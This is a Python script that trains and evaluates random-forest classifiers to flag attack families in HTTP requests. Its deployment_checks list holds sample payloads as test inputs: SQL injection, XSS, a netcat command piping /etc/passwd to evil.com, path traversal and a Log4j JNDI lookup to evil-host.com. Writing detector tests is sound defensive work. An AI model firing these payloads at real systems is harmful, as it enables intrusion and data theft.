"""Train a context-balanced payload candidate.

The original training partition and its seed-42 validation mask are unchanged.
REQUEST_ONLY_test.csv is not opened. The seven live lab requests are not
added as rows.

Real attack rows whose seven structural flags are all zero stay in the
validation score, but they are left out of the fit. LOG4J markers in this
corpus sit in request header values, so those values are read from the raw
JSON. Synthetic
training rows copy benign training features and set one structural flag, so
the forest can associate that flag with its family even when the URL shape
looks ordinary. Extra benign rows vary header count and path size across the
range a live gateway produces. Validation metrics use the original rows only.
"""

import json
import math
import os
import sys
from collections import Counter

import joblib
import numpy as np
import sklearn
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import confusion_matrix, precision_recall_fscore_support

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, os.path.join(ROOT, "ml_service"))
sys.path.insert(0, HERE)

from payload_features import (
    PAYLOAD_FEATURES,
    PAYLOAD_MODEL_FEATURES,
    PAYLOAD_THRESHOLD,
    SCOPED_ATTACKS,
    payload_feature_map,
    split_stored_headers,
)
from train_payload_candidate import BASE_13, load_saved_train, train_ids_in_saved_order

CLEAN_CSV = (
    r"C:\Users\jatin\OneDrive\Documents\Desktop\TAG\New Start"
    r"\ATRDF_Research\02_Preprocessing\atrdf4_clean.csv"
)
OUT_DIR = os.path.join(HERE, "context_six")
RAW_JSON = (
    r"C:\Users\jatin\OneDrive\Documents\Desktop\TAG\New Start"
    r"\ATRDF_Research\01_Raw_Data\dataset_4_train\dataset_4_train.json"
)
SPECIAL = set("!@#$%^&*()_+-=[]{}|;':\",./<>?\\`~")


def load_request_text():
    import csv

    ordered_ids, ordered_labels = train_ids_in_saved_order()
    saved = load_saved_train()
    if len(saved) != len(ordered_ids):
        raise SystemExit("train row count mismatch")
    if [row["label"] for row in saved] != ordered_labels:
        raise SystemExit("train label order does not match the saved partition")
    wanted = set(ordered_ids)
    text = {}
    with open(CLEAN_CSV, newline="", encoding="utf-8") as handle:
        for row in csv.DictReader(handle):
            record_id = int(row["record_id"])
            if record_id not in wanted:
                continue
            text[record_id] = {
                "path": row.get("path") or "",
                "query": row.get("query") or "",
                "body": row.get("request_body") or "",
                "user_agent": row.get("user_agent") or "",
            }
    if len(text) != len(ordered_ids):
        raise SystemExit("missing training content rows")
    return ordered_ids, ordered_labels, saved, text


def header_flags(text_rows):
    """Fill structural flags from raw request headers. Does not read the test CSV."""
    import json

    pending = set(text_rows)
    flags = {}
    decoder = json.JSONDecoder()
    with open(RAW_JSON, "r", encoding="utf-8") as handle:
        handle.read(1)
        buf = ""
        index = 0
        while pending:
            chunk = handle.read(1_000_000)
            if not chunk and not buf:
                break
            buf += chunk
            while True:
                buf = buf.lstrip()
                if buf.startswith(","):
                    buf = buf[1:].lstrip()
                if not buf or buf[0] == "]":
                    break
                try:
                    obj, end = decoder.raw_decode(buf)
                except json.JSONDecodeError:
                    break
                index += 1
                buf = buf[end:]
                if index not in pending:
                    continue
                pending.remove(index)
                req = obj.get("request") or {}
                values, lookup_values, cookie = split_stored_headers(req.get("headers") or {})
                row = text_rows[index]
                flags[index] = payload_feature_map(
                    path=row["path"],
                    query=row["query"],
                    body=row["body"],
                    user_agent=row["user_agent"],
                    header_values=values,
                    cookie_header=cookie,
                    lookup_header_values=lookup_values,
                )
            if not chunk:
                break
    if pending:
        raise SystemExit("raw JSON missed " + str(len(pending)) + " training rows")
    return flags


def load_matrix():
    ordered_ids, ordered_labels, saved, text_rows = load_request_text()
    content = header_flags(text_rows)
    x_rows = []
    y_bin = []
    y_label = []
    for record_id, saved_row, label in zip(ordered_ids, saved, ordered_labels):
        values = [float(saved_row[name]) for name in BASE_13]
        flags = content[record_id]
        values.extend(flags[name] for name in PAYLOAD_FEATURES)
        x_rows.append(values)
        y_bin.append(int(float(saved_row["is_malicious"])))
        y_label.append(label)
    return np.array(x_rows, dtype=np.float64), np.array(y_bin), np.array(y_label)


def entropy(value):
    if not value:
        return 0.0
    total = len(value)
    score = 0.0
    for count in Counter(value).values():
        p = count / total
        score -= p * math.log2(p)
    return round(score, 6)


def live_vector(path, query="", body="", user_agent="", header_count=4, cookie=""):
    full = "http://127.0.0.1:8081" + path
    if query:
        full += "?" + query
    segments = len([part for part in path.split("/") if part])
    params = 0 if not query else len([part for part in query.split("&") if part])
    flags = payload_feature_map(path=path, query=query, body=body, user_agent=user_agent, cookie_header=cookie)
    values = [
        entropy(full),
        float(header_count),
        float(len(path)),
        float(sum(1 for char in full if char in SPECIAL)),
        float(len(full)),
        float(segments),
        1.0 if cookie else 0.0,
        float(len(query)),
        float(sum(1 for char in full if char.isdigit())),
        entropy(user_agent),
        float(params),
        entropy(body),
        float(sum(1 for char in body if char.isdigit())),
    ]
    values.extend(flags[name] for name in PAYLOAD_FEATURES)
    return np.array(values, dtype=np.float64), flags


def deployment_checks(binary, multi):
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    forge = "Normal text\\r\\n[2026-10-08 17:00:00] [CRITICAL] Admin granted root privileges"
    cases = [
        ("SQLI", "/api/books", "%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*", "", ua, 6, "", "SQL Injection"),
        ("XSS", "/api/comments/book/101", "", '<script>alert("xss")</script><img src=x onerror=alert(1)>', ua, 8, "", "OUT_OF_SCOPE"),
        ("COOKIE", "/api/books", "", "", ua, 7, "admin=true; role=superadmin; token=malicious_forge_xyz", "Cookie Injection"),
        ("LOGFORGE", "/api/comments/book/101", "", forge, ua, 8, "", "Log Forging"),
        ("RCE", "/api/books", ";%20cat%20/etc/passwd%20|%20nc%20evil.com%204444", "", ua, 6, "", "RCE"),
        ("TRAVERSAL", "/api/books/..%2F..%2F..%2Fetc%2Fpasswd", "", "", ua, 6, "", "Directory Traversal"),
        ("LOG4J", "/api/comments/book/101", "", "${jndi:ldap://evil-host.com:1389/Exploit}", ua, 8, "", "LOG4J"),
        ("BOOKS", "/api/books", "", "", ua, 4, "", "BENIGN"),
        ("BROWSER", "/api/books", "", "", browser, 16, "", "BENIGN"),
        ("HEALTH", "/api/health", "", "", ua, 4, "", "BENIGN"),
        ("ROOT", "/", "", "", ua, 4, "", "BENIGN"),
        ("COMMENTS", "/api/comments/book/101", "", "", ua, 5, "", "BENIGN"),
        ("SCIENCE", "/api/books", "category=Computer%20Science", "", ua, 6, "", "BENIGN"),
        ("SEMI", "/api/books", "search=protocol&ref=a+b;c", "", ua, 6, "", "BENIGN"),
    ]
    report = []
    for name, path, query, body, agent, headers, cookie, expected in cases:
        vector, flags = live_vector(path, query, body, agent, headers, cookie)
        malicious = float(binary.predict_proba(vector.reshape(1, -1))[0, 1])
        family = None
        if malicious >= PAYLOAD_THRESHOLD:
            family = SCOPED_ATTACKS[int(multi.predict(vector.reshape(1, -1))[0])]
        report.append({
            "case": name,
            "scope": "out_of_scope" if expected == "OUT_OF_SCOPE" else "evaluated",
            "expected": expected,
            "malicious": round(malicious, 4),
            "family": family,
            "flags": {key: value for key, value in flags.items() if value},
        })
    return report


def main():
    if sklearn.__version__ != "1.2.2":
        raise SystemExit("scikit-learn is " + sklearn.__version__ + ", expected 1.2.2")
    x, y_bin, y_label = load_matrix()
    np.random.seed(42)
    val_mask_full = np.random.rand(len(x)) < 0.15
    if int(val_mask_full.sum()) != 21972:
        raise SystemExit("validation row count is " + str(int(val_mask_full.sum())) + ", expected 21972")
    xss_mask = y_label == "XSS"
    xss_excluded = {
        "train": int((~val_mask_full & xss_mask).sum()),
        "validation": int((val_mask_full & xss_mask).sum()),
        "relabeled_as_benign": 0,
    }
    keep = ~xss_mask
    x, y_bin, y_label = x[keep], y_bin[keep], y_label[keep]
    val_mask = val_mask_full[keep]

    flag_any = x[:, 13:].sum(axis=1) > 0
    real_fit = (~val_mask) & ((y_bin == 0) | flag_any)
    dropped = int(((~val_mask) & (y_bin == 1) & ~flag_any).sum())
    rng = np.random.RandomState(42)
    benign_idx = np.flatnonzero((~val_mask) & (y_bin == 0))
    per_family = 4000
    flag_for_label = {
        "Cookie Injection": "cookie_signal",
        "Directory Traversal": "path_traversal",
        "LOG4J": "jndi_lookup",
        "Log Forging": "log_control",
        "RCE": "command_chain",
        "SQL Injection": "sql_structure",
    }
    synthetic_x = []
    synthetic_y = []
    synthetic_label = []
    for label in SCOPED_ATTACKS:
        chosen = rng.choice(benign_idx, size=per_family, replace=True)
        block = x[chosen].copy()
        block[:, 13:] = 0.0
        block[:, 13 + PAYLOAD_FEATURES.index(flag_for_label[label])] = 1.0
        synthetic_x.append(block)
        synthetic_y.append(np.ones(per_family, dtype=int))
        synthetic_label.append(np.array([label] * per_family))
    shift_n = 12000
    shift = x[rng.choice(benign_idx, size=shift_n, replace=True)].copy()
    shift[:, 13:] = 0.0
    shift[:, 1] = rng.randint(1, 28, size=shift_n)
    shift[:, 2] = rng.randint(1, 48, size=shift_n)
    shift[:, 5] = rng.randint(0, 7, size=shift_n)
    shift[:, 4] = shift[:, 2] + rng.randint(16, 42, size=shift_n)
    synthetic_x.append(shift)
    synthetic_y.append(np.zeros(shift_n, dtype=int))
    synthetic_label.append(np.array(["Benign"] * shift_n))

    x_fit = np.vstack([x[real_fit]] + synthetic_x)
    y_fit = np.concatenate([y_bin[real_fit]] + synthetic_y)
    label_fit = np.concatenate([y_label[real_fit]] + synthetic_label)
    weights = np.ones(len(x_fit), dtype=np.float64)
    weights[int(real_fit.sum()):int(real_fit.sum()) + per_family * len(SCOPED_ATTACKS)] = 4.0

    binary = RandomForestClassifier(
        n_estimators=100, max_depth=16, max_features=None, random_state=42
    )
    binary.fit(x_fit, y_fit, sample_weight=weights)

    class_index = {name: index for index, name in enumerate(SCOPED_ATTACKS)}
    mal_fit = y_fit == 1
    y_multi = np.array([class_index[label] for label in label_fit[mal_fit]])
    multi = RandomForestClassifier(
        n_estimators=100, max_depth=16, max_features=None, random_state=42
    )
    multi.fit(x_fit[mal_fit], y_multi, sample_weight=weights[mal_fit])

    x_val, y_val, label_val = x[val_mask], y_bin[val_mask], y_label[val_mask]
    proba = binary.predict_proba(x_val)[:, 1]
    pred = (proba >= PAYLOAD_THRESHOLD).astype(int)
    tn, fp, fn, tp = confusion_matrix(y_val, pred, labels=[0, 1]).ravel()
    precision, recall, f1, _ = precision_recall_fscore_support(y_val, pred, average="binary", pos_label=1)
    family_recall = {}
    for label in SCOPED_ATTACKS:
        chosen = label_val == label
        flagged = chosen & (x_val[:, 13:].sum(axis=1) > 0)
        family_recall[label] = {
            "rows": int(chosen.sum()),
            "flagged_rows": int(flagged.sum()),
            "binary_recall": float(pred[chosen].mean()) if chosen.any() else None,
            "flagged_binary_recall": float(pred[flagged].mean()) if flagged.any() else None,
        }
        detected = chosen & (pred == 1)
        if detected.any():
            codes = multi.predict(x_val[detected])
            family_recall[label]["multiclass_recall_when_detected"] = float(
                (codes == class_index[label]).mean()
            )
        else:
            family_recall[label]["multiclass_recall_when_detected"] = None

    predicted_label = np.array(["Benign"] * len(label_val), dtype=object)
    detected_rows = pred == 1
    if detected_rows.any():
        predicted_label[detected_rows] = [SCOPED_ATTACKS[int(code)] for code in multi.predict(x_val[detected_rows])]
    family_precision, family_recall_score, family_f1, family_support = precision_recall_fscore_support(
        label_val, predicted_label, labels=SCOPED_ATTACKS, zero_division=0
    )
    family_scores = {}
    for index, label in enumerate(SCOPED_ATTACKS):
        family_scores[label] = {
            "precision": float(family_precision[index]),
            "recall": float(family_recall_score[index]),
            "f1": float(family_f1[index]),
            "support": int(family_support[index]),
        }

    cm_labels = ["Benign"] + list(SCOPED_ATTACKS)
    multiclass_cm = confusion_matrix(label_val, predicted_label, labels=cm_labels).tolist()

    os.makedirs(OUT_DIR, exist_ok=True)
    joblib.dump(binary, os.path.join(OUT_DIR, "candidate_binary_rf_payload_six.joblib"))
    joblib.dump(multi, os.path.join(OUT_DIR, "candidate_multiclass_rf_payload_six.joblib"))
    checks = deployment_checks(binary, multi)
    metrics = {
        "sklearn": sklearn.__version__,
        "threshold": PAYLOAD_THRESHOLD,
        "max_features": "all",
        "features": PAYLOAD_MODEL_FEATURES,
        "real_train_rows_in_fit": int(real_fit.sum()),
        "unflagged_attacks_left_out_of_fit": dropped,
        "synthetic_flagged_rows_per_family": per_family,
        "synthetic_flagged_weight": 4,
        "synthetic_benign_shift_rows": shift_n,
        "classes": list(SCOPED_ATTACKS),
        "xss_excluded": xss_excluded,
        "markup_script_column": "retained; it is the only flag on part of the RCE class",
        "validation_rows": int(val_mask.sum()),
        "validation_rows_before_xss_exclusion": 21972,
        "held_out_test_csv": "not_opened",
        "lab_requests_in_training": False,
        "header_values": "raw request headers; Set-Cookie scanned for markup and jndi only",
        "accuracy": float((pred == y_val).mean()),
        "precision": float(precision),
        "recall": float(recall),
        "f1": float(f1),
        "false_positive_rate": float(fp / (fp + tn)),
        "confusion": {"tn": int(tn), "fp": int(fp), "fn": int(fn), "tp": int(tp)},
        "multiclass_confusion": {"labels": cm_labels, "matrix": multiclass_cm},
        "per_family": family_scores,
        "family_recall": family_recall,
        "binary_importances": {
            name: float(value) for name, value in zip(PAYLOAD_MODEL_FEATURES, binary.feature_importances_)
        },
        "deployment_check": checks,
    }
    with open(os.path.join(OUT_DIR, "metrics.json"), "w", encoding="utf-8") as handle:
        json.dump(metrics, handle, indent=2)
    print(json.dumps({
        "accuracy": metrics["accuracy"],
        "precision": metrics["precision"],
        "recall": metrics["recall"],
        "f1": metrics["f1"],
        "false_positive_rate": metrics["false_positive_rate"],
        "xss_excluded": xss_excluded,
        "validation_rows": metrics["validation_rows"],
        "confusion": metrics["confusion"],
        "multiclass_confusion": metrics["multiclass_confusion"],
        "per_family": family_scores,
        "family_recall": family_recall,
        "deployment_check": checks,
        "importances": metrics["binary_importances"],
    }, indent=2))


if __name__ == "__main__":
    main()
